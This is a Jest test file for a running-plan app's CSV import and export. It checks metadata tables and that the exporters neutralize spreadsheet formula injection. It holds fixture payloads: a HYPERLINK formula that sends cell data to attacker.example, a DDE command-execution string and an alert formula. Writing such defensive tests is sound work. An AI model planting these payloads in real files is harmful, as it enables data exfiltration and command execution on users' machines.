import { parseCsv, workoutsToFinalSurgeCsv, workoutsToRunFlowCsv, workoutsToTrainingPeaksCsv, type ParsedCsvWorkout } from '../csv-parser';

describe('RunFlow CSV metadata', () => {
    it('exports a plan metadata table before workout rows', () => {
        const workouts: ParsedCsvWorkout[] = [{
            date: '2026-10-18',
            workoutType: 'RACE',
            phase: 'RACE_WEEK',
            name: 'Race Day',
            description: 'Race Day: 21.1km',
            distanceM: 21097,
            durationS: 6000,
            paceSKm: 284,
            hrZone: 5,
        }];

        const csv = workoutsToRunFlowCsv(workouts, [
            { section: 'Plan', field: 'Generated At', value: '2026-05-27T10:00:00.000Z' },
            { section: 'Heart Rate Zones', field: 'Zone 4 Max', value: 170 },
        ]);

        expect(csv.split('\n')[0]).toBe('section,field,value');
        expect(csv).toContain('"Plan","Generated At","2026-05-27T10:00:00.000Z"');
        expect(csv).toContain('date,workout_type,phase,name,description,distance_m,duration_s,pace_s_km,hr_zone,structured_steps');
    });

    it('imports RunFlow workout rows after a metadata table', () => {
        const csv = [
            'section,field,value',
            '"Plan","Generated At","2026-05-27T10:00:00.000Z"',
            '"Heart Rate Zones","Zone 4 Max","170"',
            '',
            'date,workout_type,phase,name,description,distance_m,duration_s,pace_s_km,hr_zone,structured_steps',
            '2026-10-18,RACE,RACE_WEEK,"Race Day","Race Day: 21.1km",21097,6000,284,5,',
        ].join('\n');

        const result = parseCsv(csv, 'runflow');

        expect(result.errors).toEqual([]);
        expect(result.workouts).toHaveLength(1);
        expect(result.workouts[0]).toMatchObject({
            date: '2026-10-18',
            workoutType: 'RACE',
            phase: 'RACE_WEEK',
            distanceM: 21097,
            durationS: 6000,
            paceSKm: 284,
            hrZone: 5,
        });
    });
});

describe('CSV formula-injection neutralization (export builders)', () => {
    // Cells an attacker controls through plan import (customName/description
    // are stored verbatim) — the exported CSV must never let them evaluate as
    // spreadsheet formulas.
    const malicious: ParsedCsvWorkout = {
        date: '2026-10-18',
        workoutType: 'RACE',
        name: '=HYPERLINK("http://attacker.example/pixel?c="&A2,"View pace chart")',
        description: "=cmd|' /C calc'!A0",
    };

    it('neutralizes formula-leading name/description in all three export formats', () => {
        const cases = [
            workoutsToRunFlowCsv([malicious]),
            workoutsToTrainingPeaksCsv([malicious]),
            workoutsToFinalSurgeCsv([malicious]),
        ];
        for (const csv of cases) {
            // Every quoted cell that begins with a formula trigger carries the
            // apostrophe prefix in the raw bytes…
            expect(csv).toContain('"\'=HYPERLINK(""http://attacker.example/pixel?c=""&A2,""View pace chart"")"');
            expect(csv).toContain("\"'=cmd|' /C calc'!A0\"");
            // …and contains no un-neutralized formula-leading quoted cell.
            expect(csv).not.toMatch(/,"=[^"]/);
        }
    });

    it('neutralizes formula-leading metadata values (goal name)', () => {
        const csv = workoutsToRunFlowCsv([malicious], [
            { section: 'Plan', field: 'Plan Name', value: '=SUM(1+1)*alert(1)' },
        ]);
        expect(csv).toContain('"\'=SUM(1+1)*alert(1)"');
    });

    it('leaves inert cells byte-identical to the old quote-doubling behavior', () => {
        const inert: ParsedCsvWorkout = {
            date: '2026-10-18',
            workoutType: 'RACE',
            name: 'Race Day',
            description: 'Race Day: 21.1km',
        };
        expect(workoutsToRunFlowCsv([inert])).toContain('"Race Day","Race Day: 21.1km"');
        expect(workoutsToTrainingPeaksCsv([inert])).toContain('"Race Day","Race Day: 21.1km"');
        expect(workoutsToFinalSurgeCsv([inert])).toContain('"Race Day","Race Day: 21.1km"');
    });

    it('still roundtrips through parseCsv with formula cells present', () => {
        const csv = workoutsToRunFlowCsv([malicious], [
            { section: 'Plan', field: 'Generated At', value: '2026-05-27T10:00:00.000Z' },
        ]);

        const result = parseCsv(csv, 'runflow');

        expect(result.errors).toEqual([]);
        expect(result.workouts).toHaveLength(1);
        // The apostrophe prefix survives the roundtrip: the parsed value is
        // inert text, never a formula-leading string.
        expect(result.workouts[0].name).toBe("'=HYPERLINK(\"http://attacker.example/pixel?c=\"&A2,\"View pace chart\")");
        expect(result.workouts[0].description).toBe("'=cmd|' /C calc'!A0");
    });

    it('roundtrips TrainingPeaks and FinalSurge exports with formula cells', () => {
        const tp = parseCsv(workoutsToTrainingPeaksCsv([malicious]), 'trainingpeaks');
        const fs = parseCsv(workoutsToFinalSurgeCsv([malicious]), 'finalsurge');

        for (const result of [tp, fs]) {
            expect(result.errors).toEqual([]);
            expect(result.workouts).toHaveLength(1);
            expect(result.workouts[0].name.startsWith("'=")).toBe(true);
            expect(result.workouts[0].description.startsWith("'=")).toBe(true);
        }
    });
});
